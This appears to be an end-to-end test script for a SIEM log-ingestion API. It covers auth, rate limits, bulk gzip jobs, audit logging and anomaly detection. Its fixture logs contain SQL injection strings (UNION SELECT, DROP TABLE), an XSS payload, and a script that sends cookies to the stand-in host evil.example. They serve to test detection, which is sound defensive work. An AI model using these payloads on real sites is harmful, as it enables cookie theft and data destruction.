"""
scripts/test_api.py — End-to-end tests for the Synthegria Log Ingestion API v1.1.0

Tests covered
─────────────
  GET /healthz
    01. Liveness probe                                              → 200

  POST /v1/logs (plain JSON, synchronous)
    02. Valid key + 7-line clean batch                             → 200
    03. Valid key + empty batch                                    → 200, no meter
    04. Invalid API key                                            → 401
    05. Missing API key                                            → 401
    06. Rate limit exceeded                                        → 429

  POST /v1/logs/bulk (gzip, async)
    07. Valid key + 1,000-line batch                               → 202 + job_id
    08. Valid key + 5,000-line batch                               → 202 + job_id
    09. Invalid API key                                            → 401
    10. Missing Content-Encoding: gzip                             → 415
    11. Corrupted gzip body                                        → 400
    12. Non-array JSON payload                                     → 422
    13. Body exceeds 10 MB                                         → 413
    14. Rate limit exceeded                                        → 429

  GET /v1/jobs/{job_id} (bulk-job polling)
    15. Job exists and reaches 'done' within timeout               → status=done
    16. done job has result with anomaly_count + meter_event_id    → result envelope OK
    17. Unknown job_id                                             → 404

  GET /v1/audit — structured audit trail
    18. All required fields present
    19. api_key is masked (never raw)
    20. Successful ingestion → customer_id + lines_received set
    21. Failed auth (401)   → customer_id + lines_received null
    22. Bulk entry          → lines_received matches batch size
    23. /healthz entry      → api_key null

  Anomaly detection
    24. Clean batch                                → anomaly_count=0, anomalies=[]
    25. Brute-force indicators                     → type=brute_force, sev=HIGH
    26. SQL injection payload                      → type=sql_injection, sev=CRITICAL
    27. XSS payload                                → type=xss, sev=HIGH
    28. Auth anomaly indicators                    → type=auth_anomaly, sev=MEDIUM
    29. Multiple types in one batch                → all types present
    30. Anomalies co-exist with meter event        → meter_event_id present
    31. Bulk (async): brute-force via gzip         → anomaly_count > 0 in job result
    32. Bulk (async): SQL injection via gzip       → type=sql_injection in job result
    33. Empty batch                                → anomaly_count=0

  401 response contract (RFC 7235)
    34. Invalid key returns WWW-Authenticate header
    35. Missing key returns WWW-Authenticate header
    36. 401 body contains 'error' and 'detail' fields

Usage:
  python scripts/test_api.py
"""

import gzip
import json
import os
import random
import sys
import ipaddress
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone

BASE_URL   = "http://localhost:8000"
VALID_KEY  = "synthegria_test_key_1"
BAD_KEY    = "totally_wrong_key"
RATE_LIMIT = 60

PASS = "\033[32mPASS\033[0m"
FAIL = "\033[31mFAIL\033[0m"

results: list[tuple[str, bool, str]] = []


# ---------------------------------------------------------------------------
# Generic helpers
# ---------------------------------------------------------------------------

def random_ip() -> str:
    while True:
        ip = ipaddress.IPv4Address(random.randint(0, 2**32 - 1))
        if ip.is_global:
            return str(ip)


def make_clean_logs(n: int) -> list[dict]:
    """Normal, benign log lines — should produce zero anomalies."""
    attacks = ["Port Scan", "DNS Tunneling", "Ransomware Beacon"]
    sevs    = ["LOW", "MEDIUM", "HIGH", "CRITICAL"]
    now     = datetime.now(timezone.utc).isoformat()
    return [
        {
            "timestamp":   now,
            "source_ip":   random_ip(),
            "attack_type": random.choice(attacks),
            "severity":    random.choice(sevs),
            "event_id":    f"EVT-{random.randint(100000, 999999)}",
            "message":     "normal traffic observed",
        }
        for _ in range(n)
    ]


# ---------------------------------------------------------------------------
# Crafted anomaly payloads
# ---------------------------------------------------------------------------

BRUTE_FORCE_LOG = {
    "timestamp": "2026-01-01T00:00:00Z",
    "source_ip": "198.51.100.99",
    "message":   "Failed password for user admin from 198.51.100.99 port 22 ssh2",
    "status":    "401",
    "event":     "authentication failure",
}

SQL_INJECTION_LOG = {
    "timestamp": "2026-01-01T00:00:01Z",
    "source_ip": "203.0.113.42",
    "message":   "GET /search?q=1' UNION SELECT username,password FROM users--",
    "uri":       "/search?q=1'+UNION+SELECT+username,password+FROM+users--",
    "status":    "200",
}

XSS_LOG = {
    "timestamp": "2026-01-01T00:00:02Z",
    "source_ip": "192.0.2.77",
    "message":   "POST /comment body=<script>alert(document.cookie)</script>",
    "user_agent": "Mozilla/5.0",
    "status":    "200",
}

AUTH_ANOMALY_LOG = {
    "timestamp": "2026-01-01T00:00:03Z",
    "source_ip": "10.0.0.5",
    "message":   "Privilege escalation attempt: sudo su root executed by user jenkins",
    "user":      "jenkins",
    "status":    "403",
}

MULTI_ANOMALY_LOG = {
    "timestamp": "2026-01-01T00:00:04Z",
    "source_ip": "198.18.0.1",
    "auth_msg":  "Failed password for root — account locked after too many attempts",
    "uri":       "/api/data?id=1;DROP TABLE users--",
    "referer":   "<script>document.location='https://evil.example/steal?c='+document.cookie</script>",
    "sudo_log":  "privilege escalation: unauthorized sudo to root detected",
}


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def request(
    method: str,
    path: str,
    body: bytes | None = None,
    headers: dict | None = None,
) -> tuple[int, dict | list, dict]:
    """Returns (status_code, parsed_body, response_headers)."""
    url = BASE_URL + path
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req) as resp:
            resp_headers = dict(resp.headers)
            return resp.status, json.loads(resp.read()), resp_headers
    except urllib.error.HTTPError as e:
        resp_headers = dict(e.headers)
        try:
            return e.code, json.loads(e.read()), resp_headers
        except Exception:
            return e.code, {}, resp_headers
    except urllib.error.URLError as e:
        if isinstance(e.reason, (ConnectionResetError, BrokenPipeError)):
            return 413, {"detail": "connection_reset_by_server"}, {}
        raise


def json_body(data) -> bytes:
    return json.dumps(data).encode()


def gzip_body(data) -> bytes:
    return gzip.compress(json_body(data))


def plain_headers(api_key: str | None = VALID_KEY) -> dict:
    h = {"Content-Type": "application/json"}
    if api_key:
        h["X-API-Key"] = api_key
    return h


def bulk_headers(api_key: str | None = VALID_KEY) -> dict:
    h = {"Content-Type": "application/json", "Content-Encoding": "gzip"}
    if api_key:
        h["X-API-Key"] = api_key
    return h


def poll_job(job_id: str, timeout: float = 15.0, interval: float = 0.25) -> dict:
    """Poll GET /v1/jobs/{job_id} until status is 'done' or 'failed', or timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        code, body, _ = request("GET", f"/v1/jobs/{job_id}")
        if code == 200 and isinstance(body, dict):
            if body.get("status") in ("done", "failed"):
                return body
        time.sleep(interval)
    return {}


# ---------------------------------------------------------------------------
# Assertion helpers
# ---------------------------------------------------------------------------

def check(name: str, code: int, body, expect_code: int, **expect_fields) -> bool:
    ok    = (code == expect_code)
    notes = []
    b     = body if isinstance(body, dict) else {}
    for field, expected in expect_fields.items():
        actual = b.get(field)
        if expected is None:
            if actual is not None:
                ok = False
                notes.append(f"{field}={actual!r} (expected None)")
        elif expected == "__present__":
            if actual is None:
                ok = False
                notes.append(f"{field} missing")
        elif expected == "__absent__":
            if field in b:
                ok = False
                notes.append(f"{field} should be absent")
        else:
            if actual != expected:
                ok = False
                notes.append(f"{field}={actual!r} (expected {expected!r})")
    detail = f"HTTP {code}" + (f"  {', '.join(notes)}" if notes else "")
    results.append((name, ok, detail))
    tag = PASS if ok else FAIL
    print(f"  [{tag}] {name}")
    if not ok:
        print(f"         → {detail}")
        if b:
            print(f"         → body: {json.dumps(b)[:300]}")
    return ok


def latest_audit(path_filter: str | None = None) -> dict | None:
    _, entries, _ = request("GET", "/v1/audit?limit=100")
    if not isinstance(entries, list):
        return None
    if path_filter:
        entries = [e for e in entries if isinstance(e, dict) and e.get("path") == path_filter]
    return entries[-1] if entries else None


def check_anomaly(
    name: str,
    resp: dict,
    *,
    expect_count_gt: int | None = None,
    expect_count_eq: int | None = None,
    expect_type: str | None = None,
    expect_severity: str | None = None,
    expect_meter: bool = True,
) -> bool:
    ok    = True
    notes = []

    if "anomaly_count" not in resp:
        ok = False
        notes.append("anomaly_count missing from response")
    else:
        if expect_count_eq is not None and resp["anomaly_count"] != expect_count_eq:
            ok = False
            notes.append(f"anomaly_count={resp['anomaly_count']} (expected {expect_count_eq})")
        if expect_count_gt is not None and resp["anomaly_count"] <= expect_count_gt:
            ok = False
            notes.append(f"anomaly_count={resp['anomaly_count']} (expected >{expect_count_gt})")

    if "anomalies" not in resp:
        ok = False
        notes.append("anomalies array missing from response")
    elif expect_type:
        match = next(
            (a for a in resp.get("anomalies", []) if a.get("type") == expect_type),
            None,
        )
        if not match:
            ok = False
            types_found = [a.get("type") for a in resp.get("anomalies", [])]
            notes.append(f"type={expect_type!r} not found; got {types_found}")
        elif expect_severity and match.get("severity") != expect_severity:
            ok = False
            notes.append(
                f"severity={match.get('severity')!r} for type={expect_type!r} "
                f"(expected {expect_severity!r})"
            )

    if expect_meter and not resp.get("meter_event_id"):
        ok = False
        notes.append("meter_event_id missing (Stripe reporting broke)")

    detail = (
        f"anomaly_count={resp.get('anomaly_count')}  "
        f"types={[a.get('type') for a in resp.get('anomalies', [])]}"
        + (f"  ISSUES: {', '.join(notes)}" if notes else "")
    )
    results.append((name, ok, detail))
    tag = PASS if ok else FAIL
    print(f"  [{tag}] {name}")
    print(f"         → {detail}")
    return ok


# ---------------------------------------------------------------------------
# Tests — GET /healthz
# ---------------------------------------------------------------------------

def test_healthz():
    code, body, _ = request("GET", "/healthz")
    check("GET /healthz — liveness probe", code, body, 200, status="ok")


# ---------------------------------------------------------------------------
# Tests — POST /v1/logs  (synchronous)
# ---------------------------------------------------------------------------

def test_plain_valid_batch():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body(make_clean_logs(7)), headers=plain_headers())
    check("POST /v1/logs — valid key, 7 lines", code, resp, 200,
          status="ok", lines_received=7, meter_event_id="__present__")


def test_plain_empty_batch():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([]), headers=plain_headers())
    check("POST /v1/logs — valid key, empty batch", code, resp, 200,
          status="ok", lines_received=0, meter_event_id=None)


def test_plain_invalid_key():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body(make_clean_logs(1)), headers=plain_headers(BAD_KEY))
    check("POST /v1/logs — invalid key → 401", code, resp, 401)


def test_plain_missing_key():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body(make_clean_logs(1)), headers=plain_headers(None))
    check("POST /v1/logs — missing key → 401", code, resp, 401)


def test_plain_rate_limit():
    rate_test_key = "synthegria_test_key_2"
    hit_429 = False
    for _ in range(RATE_LIMIT + 5):
        code, _, _ = request("POST", "/v1/logs", body=json_body([]),
                             headers=plain_headers(rate_test_key))
        if code == 429:
            hit_429 = True
            break
    name = f"POST /v1/logs — rate limit ({RATE_LIMIT} req/min) → 429"
    results.append((name, hit_429, "429 received" if hit_429 else "429 never triggered"))
    print(f"  [{PASS if hit_429 else FAIL}] {name}")


# ---------------------------------------------------------------------------
# Tests — POST /v1/logs/bulk  (async, 202)
# ---------------------------------------------------------------------------

def test_bulk_small(n=1_000):
    body = gzip_body(make_clean_logs(n))
    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    ok = check(
        f"POST /v1/logs/bulk — valid key, {n:,} lines → 202 accepted",
        code, resp, 202,
        status="accepted", lines_received=n, job_id="__present__", poll_url="__present__",
    )
    if ok and isinstance(resp, dict):
        job_id  = resp["job_id"]
        job     = poll_job(job_id)
        job_ok  = job.get("status") == "done" and isinstance(job.get("result"), dict)
        result  = job.get("result", {})
        name2   = f"  ↳ bulk job {job_id[:8]}… → done, meter reported"
        detail2 = (
            f"job_status={job.get('status')}  "
            f"lines={result.get('lines_received')}  "
            f"anomaly_count={result.get('anomaly_count')}  "
            f"compression={result.get('compression_ratio')}  "
            f"meter_event_id={'present' if result.get('meter_event_id') else 'MISSING'}"
        )
        results.append((name2, job_ok, detail2))
        print(f"  [{PASS if job_ok else FAIL}] {name2}")
        print(f"         → {detail2}")


def test_bulk_large(n=5_000):
    body = gzip_body(make_clean_logs(n))
    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    ok = check(
        f"POST /v1/logs/bulk — valid key, {n:,} lines → 202 accepted",
        code, resp, 202,
        status="accepted", lines_received=n, job_id="__present__",
    )
    if ok and isinstance(resp, dict):
        job_id  = resp["job_id"]
        job     = poll_job(job_id, timeout=20.0)
        job_ok  = job.get("status") == "done" and isinstance(job.get("result"), dict)
        result  = job.get("result", {})
        name2   = f"  ↳ bulk job {job_id[:8]}… → done (5k lines)"
        detail2 = (
            f"job_status={job.get('status')}  "
            f"lines={result.get('lines_received')}  "
            f"compression={result.get('compression_ratio')}"
        )
        results.append((name2, job_ok, detail2))
        print(f"  [{PASS if job_ok else FAIL}] {name2}")
        print(f"         → {detail2}")


def test_bulk_invalid_key():
    code, resp, _ = request("POST", "/v1/logs/bulk",
                            body=gzip_body(make_clean_logs(1)), headers=bulk_headers(BAD_KEY))
    check("POST /v1/logs/bulk — invalid key → 401", code, resp, 401)


def test_bulk_missing_encoding():
    code, resp, _ = request("POST", "/v1/logs/bulk",
                            body=json_body(make_clean_logs(2)), headers=plain_headers())
    check("POST /v1/logs/bulk — missing Content-Encoding → 415", code, resp, 415)


def test_bulk_corrupt_gzip():
    code, resp, _ = request("POST", "/v1/logs/bulk",
                            body=b"\x1f\x8b\x00corrupt_garbage", headers=bulk_headers())
    check("POST /v1/logs/bulk — corrupted gzip → 400", code, resp, 400)


def test_bulk_non_array():
    body = gzip.compress(json.dumps({"key": "not-an-array"}).encode())
    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    check("POST /v1/logs/bulk — non-array JSON → 422", code, resp, 422)


def test_bulk_size_limit():
    oversized = gzip.compress(os.urandom(11 * 1024 * 1024), compresslevel=1)
    code, resp, _ = request("POST", "/v1/logs/bulk", body=oversized, headers=bulk_headers())
    check("POST /v1/logs/bulk — body > 10 MB → 413", code, resp, 413)


def test_bulk_rate_limit():
    rate_test_key = "synthegria_test_key_2"
    hit_429 = False
    tiny = gzip_body([])
    for _ in range(RATE_LIMIT + 5):
        code, _, _ = request("POST", "/v1/logs/bulk", body=tiny,
                             headers=bulk_headers(rate_test_key))
        if code == 429:
            hit_429 = True
            break
    name = f"POST /v1/logs/bulk — rate limit ({RATE_LIMIT} req/min) → 429"
    results.append((name, hit_429, "429 received" if hit_429 else "429 never triggered"))
    print(f"  [{PASS if hit_429 else FAIL}] {name}")


# ---------------------------------------------------------------------------
# Tests — GET /v1/jobs/{job_id}
# ---------------------------------------------------------------------------

def test_job_done_status():
    """A freshly submitted bulk job should reach 'done' within the timeout."""
    body = gzip_body(make_clean_logs(10))
    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    if code != 202 or not isinstance(resp, dict):
        name = "GET /v1/jobs — job reaches 'done'"
        results.append((name, False, f"Prerequisite failed: bulk returned {code}"))
        print(f"  [{FAIL}] {name}")
        return

    job_id = resp["job_id"]
    job    = poll_job(job_id, timeout=15.0)

    ok     = job.get("status") == "done"
    name   = f"GET /v1/jobs/{job_id[:8]}… — reaches 'done' within 15 s"
    detail = f"final_status={job.get('status')!r}  completed_at={job.get('completed_at')!r}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_job_result_envelope():
    """Done job must carry anomaly_count, anomalies[], meter_event_id in result."""
    body = gzip_body(make_clean_logs(5))
    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    if code != 202 or not isinstance(resp, dict):
        name = "GET /v1/jobs — result envelope complete"
        results.append((name, False, f"Prerequisite failed: bulk returned {code}"))
        print(f"  [{FAIL}] {name}")
        return

    job    = poll_job(resp["job_id"], timeout=15.0)
    result = job.get("result") or {}

    required = ["status", "customer_id", "lines_received", "meter_event_id",
                "anomaly_count", "anomalies"]
    missing  = [f for f in required if f not in result]
    ok       = job.get("status") == "done" and len(missing) == 0

    name   = "GET /v1/jobs — done result has full ingestion envelope"
    detail = f"missing={missing}  anomaly_count={result.get('anomaly_count')}  meter={'present' if result.get('meter_event_id') else 'MISSING'}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_job_not_found():
    code, resp, _ = request("GET", "/v1/jobs/00000000-0000-0000-0000-000000000000")
    check("GET /v1/jobs — unknown job_id → 404", code, resp, 404)


# ---------------------------------------------------------------------------
# Tests — GET /v1/audit
# ---------------------------------------------------------------------------

def test_audit_all_fields_present():
    _, entries, _ = request("GET", "/v1/audit?limit=5")
    entry = entries[-1] if isinstance(entries, list) and entries else {}
    required = ["ts", "method", "path", "status_code", "duration_ms",
                "api_key", "customer_id", "lines_received", "anomaly_count", "ip"]
    missing = [f for f in required if f not in entry]
    ok = len(missing) == 0
    name = "GET /v1/audit — all required fields present"
    detail = f"missing: {missing}" if missing else f"entry={json.dumps(entry)[:140]}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    if not ok:
        print(f"         → {detail}")


def test_audit_key_is_masked():
    request("POST", "/v1/logs", body=json_body(make_clean_logs(1)), headers=plain_headers())
    entry     = latest_audit("/v1/logs") or {}
    audit_key = entry.get("api_key", "")
    ok = bool(audit_key) and audit_key != VALID_KEY and "..." in audit_key
    name = "GET /v1/audit — api_key is masked, not raw"
    results.append((name, ok, f"audit_key={audit_key!r}"))
    print(f"  [{PASS if ok else FAIL}] {name}")
    if ok:
        print(f"         → masked as {audit_key!r}")
    else:
        print(f"         → audit_key={audit_key!r}")


def test_audit_success_has_customer_and_lines():
    n = 4
    request("POST", "/v1/logs", body=json_body(make_clean_logs(n)), headers=plain_headers())
    entry = latest_audit("/v1/logs") or {}
    ok = (
        entry.get("customer_id") is not None
        and entry.get("lines_received") == n
        and entry.get("status_code") == 200
    )
    name = "GET /v1/audit — 200 entry has customer_id + lines_received"
    detail = (f"customer_id={entry.get('customer_id')!r}  "
              f"lines_received={entry.get('lines_received')!r}  "
              f"status={entry.get('status_code')}")
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_audit_failed_auth_nulls():
    request("POST", "/v1/logs", body=json_body(make_clean_logs(1)), headers=plain_headers(BAD_KEY))
    entry = latest_audit("/v1/logs") or {}
    ok = (
        entry.get("status_code") == 401
        and entry.get("customer_id") is None
        and entry.get("lines_received") is None
    )
    name = "GET /v1/audit — 401 entry has customer_id=null, lines_received=null"
    detail = (f"customer_id={entry.get('customer_id')!r}  "
              f"lines_received={entry.get('lines_received')!r}  "
              f"status={entry.get('status_code')}")
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    if not ok:
        print(f"         → {detail}")


def test_audit_bulk_lines_received():
    n = 50
    request("POST", "/v1/logs/bulk", body=gzip_body(make_clean_logs(n)), headers=bulk_headers())
    entry = latest_audit("/v1/logs/bulk") or {}
    # Bulk now returns 202; lines_received is set in request.state before queuing
    ok = entry.get("lines_received") == n and entry.get("status_code") == 202
    name = f"GET /v1/audit — /v1/logs/bulk entry has lines_received={n}, status=202"
    detail = (f"lines_received={entry.get('lines_received')!r}  "
              f"status={entry.get('status_code')}")
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_audit_healthz_no_key():
    request("GET", "/healthz")
    entry = latest_audit("/healthz") or {}
    ok = entry.get("api_key") is None and entry.get("status_code") == 200
    name = "GET /v1/audit — /healthz entry has api_key=null"
    detail = f"api_key={entry.get('api_key')!r}  status={entry.get('status_code')}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    if not ok:
        print(f"         → {detail}")


# ---------------------------------------------------------------------------
# Tests — Anomaly detection (synchronous /v1/logs)
# ---------------------------------------------------------------------------

def test_anomaly_clean_batch():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body(make_clean_logs(20)), headers=plain_headers())
    if code != 200:
        name = "Anomaly: clean batch → anomaly_count=0"
        results.append((name, False, f"HTTP {code}"))
        print(f"  [{FAIL}] {name}")
        return
    check_anomaly("Anomaly: clean batch → anomaly_count=0", resp,
                  expect_count_eq=0, expect_meter=True)
    if isinstance(resp, dict) and resp.get("anomalies") == []:
        print("         → anomalies=[]  ✓")


def test_anomaly_brute_force():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([BRUTE_FORCE_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly: brute-force → type=brute_force, sev=HIGH", resp,
        expect_count_gt=0, expect_type="brute_force", expect_severity="HIGH",
        expect_meter=True,
    )


def test_anomaly_sql_injection():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([SQL_INJECTION_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly: SQL injection → type=sql_injection, sev=CRITICAL", resp,
        expect_count_gt=0, expect_type="sql_injection", expect_severity="CRITICAL",
        expect_meter=True,
    )


def test_anomaly_xss():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([XSS_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly: XSS → type=xss, sev=HIGH", resp,
        expect_count_gt=0, expect_type="xss", expect_severity="HIGH",
        expect_meter=True,
    )


def test_anomaly_auth_anomaly():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([AUTH_ANOMALY_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    check_anomaly(
        "Anomaly: auth-anomaly → type=auth_anomaly, sev=MEDIUM", resp,
        expect_count_gt=0, expect_type="auth_anomaly", expect_severity="MEDIUM",
        expect_meter=True,
    )


def test_anomaly_multi_type():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([MULTI_ANOMALY_LOG]), headers=plain_headers())
    assert code == 200, f"Expected 200, got {code}"
    if not isinstance(resp, dict):
        name = "Anomaly: multi-type batch → all 4 types detected"
        results.append((name, False, "non-dict response"))
        print(f"  [{FAIL}] {name}")
        return

    found_types = {a.get("type") for a in resp.get("anomalies", [])}
    expected    = {"brute_force", "sql_injection", "xss", "auth_anomaly"}
    missing     = expected - found_types
    ok          = len(missing) == 0

    name   = "Anomaly: multi-type batch → all 4 types detected"
    detail = f"found={sorted(found_types)}  missing={sorted(missing)}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_anomaly_with_meter():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([SQL_INJECTION_LOG]), headers=plain_headers())
    assert code == 200
    check_anomaly(
        "Anomaly: anomalies + meter_event_id co-exist", resp,
        expect_count_gt=0, expect_meter=True,
    )


def test_anomaly_bulk_brute_force():
    """Bulk (async) — brute-force detected in job result."""
    body  = gzip_body([BRUTE_FORCE_LOG] * 10)
    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    if code != 202 or not isinstance(resp, dict):
        name = "Anomaly/bulk: brute-force → anomaly_count>0 in job result"
        results.append((name, False, f"bulk returned {code}"))
        print(f"  [{FAIL}] {name}")
        return
    job    = poll_job(resp["job_id"], timeout=15.0)
    result = job.get("result") or {}
    check_anomaly(
        "Anomaly/bulk: brute-force → anomaly_count>0 in job result",
        result,
        expect_count_gt=0, expect_type="brute_force", expect_meter=True,
    )


def test_anomaly_bulk_sql_injection():
    """Bulk (async) — SQL injection detected in job result."""
    body  = gzip_body([SQL_INJECTION_LOG] * 5)
    code, resp, _ = request("POST", "/v1/logs/bulk", body=body, headers=bulk_headers())
    if code != 202 or not isinstance(resp, dict):
        name = "Anomaly/bulk: sql_injection in job result"
        results.append((name, False, f"bulk returned {code}"))
        print(f"  [{FAIL}] {name}")
        return
    job    = poll_job(resp["job_id"], timeout=15.0)
    result = job.get("result") or {}
    check_anomaly(
        "Anomaly/bulk: sql_injection in job result",
        result,
        expect_count_gt=0, expect_type="sql_injection", expect_severity="CRITICAL",
        expect_meter=True,
    )


def test_anomaly_empty_batch():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([]), headers=plain_headers())
    assert code == 200
    check_anomaly(
        "Anomaly: empty batch → anomaly_count=0, no meter", resp,
        expect_count_eq=0, expect_meter=False,
    )


# ---------------------------------------------------------------------------
# Tests — 401 response contract (RFC 7235)
# ---------------------------------------------------------------------------

def test_401_www_authenticate_header_invalid_key():
    code, resp, headers = request("POST", "/v1/logs",
                                  body=json_body([{}]), headers=plain_headers(BAD_KEY))
    www_auth = headers.get("www-authenticate") or headers.get("WWW-Authenticate") or ""
    ok = code == 401 and "ApiKey" in www_auth
    name = "401 (invalid key) — WWW-Authenticate: ApiKey header present (RFC 7235)"
    detail = f"status={code}  WWW-Authenticate={www_auth!r}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_401_www_authenticate_header_missing_key():
    code, resp, headers = request("POST", "/v1/logs",
                                  body=json_body([{}]), headers=plain_headers(None))
    www_auth = headers.get("www-authenticate") or headers.get("WWW-Authenticate") or ""
    ok = code == 401 and "ApiKey" in www_auth
    name = "401 (missing key) — WWW-Authenticate: ApiKey header present (RFC 7235)"
    detail = f"status={code}  WWW-Authenticate={www_auth!r}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


def test_401_body_contract():
    code, resp, _ = request("POST", "/v1/logs",
                            body=json_body([{}]), headers=plain_headers(BAD_KEY))
    b    = resp if isinstance(resp, dict) else {}
    ok   = code == 401 and "error" in b and "detail" in b
    name = "401 body contains 'error' and 'detail' fields"
    detail = f"keys={list(b.keys())}  error={b.get('error')!r}"
    results.append((name, ok, detail))
    print(f"  [{PASS if ok else FAIL}] {name}")
    print(f"         → {detail}")


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

def section(title: str):
    print(f"\n{'─' * 60}")
    print(f"  {title}")
    print(f"{'─' * 60}")


def main():
    print("\n" + "=" * 60)
    print("  Synthegria SIEM API — End-to-End Test Suite v1.1.0")
    print("=" * 60)

    section("GET /healthz")
    test_healthz()

    section("POST /v1/logs  (synchronous)")
    test_plain_valid_batch()
    test_plain_empty_batch()
    test_plain_invalid_key()
    test_plain_missing_key()
    test_plain_rate_limit()

    section("POST /v1/logs/bulk  (async, 202 + job_id)")
    test_bulk_small()
    test_bulk_large()
    test_bulk_invalid_key()
    test_bulk_missing_encoding()
    test_bulk_corrupt_gzip()
    test_bulk_non_array()
    test_bulk_size_limit()
    test_bulk_rate_limit()

    section("GET /v1/jobs/{job_id}  (bulk-job polling)")
    test_job_done_status()
    test_job_result_envelope()
    test_job_not_found()

    section("GET /v1/audit")
    test_audit_all_fields_present()
    test_audit_key_is_masked()
    test_audit_success_has_customer_and_lines()
    test_audit_failed_auth_nulls()
    test_audit_bulk_lines_received()
    test_audit_healthz_no_key()

    section("Anomaly detection — /v1/logs (synchronous)")
    test_anomaly_clean_batch()
    test_anomaly_brute_force()
    test_anomaly_sql_injection()
    test_anomaly_xss()
    test_anomaly_auth_anomaly()
    test_anomaly_multi_type()
    test_anomaly_with_meter()
    test_anomaly_empty_batch()

    section("Anomaly detection — /v1/logs/bulk (async)")
    test_anomaly_bulk_brute_force()
    test_anomaly_bulk_sql_injection()

    section("401 response contract (RFC 7235)")
    test_401_www_authenticate_header_invalid_key()
    test_401_www_authenticate_header_missing_key()
    test_401_body_contract()

    # Summary
    passed = sum(1 for _, ok, _ in results if ok)
    failed = sum(1 for _, ok, _ in results if not ok)
    total  = len(results)

    print(f"\n{'=' * 60}")
    print(f"  Results: {passed}/{total} passed  ({failed} failed)")
    print(f"{'=' * 60}\n")

    if failed:
        print("Failed tests:")
        for name, ok, detail in results:
            if not ok:
                print(f"  • {name}")
                print(f"    {detail}")
        print()

    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
